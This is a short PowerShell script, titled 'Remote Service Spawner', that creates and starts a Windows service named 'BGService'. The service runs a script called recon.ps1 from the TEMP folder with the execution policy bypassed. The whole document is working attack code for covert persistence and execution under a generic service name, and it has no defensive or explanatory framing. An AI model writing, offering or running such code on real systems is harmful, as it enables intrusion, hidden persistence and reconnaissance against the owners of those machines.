# Remote Service Spawner - Creates and starts a service
$svc = "BGService"
$bin = "powershell.exe -ExecutionPolicy Bypass -File $env:TEMP\recon.ps1"
sc.exe create $svc binPath= $bin
sc.exe start $svc
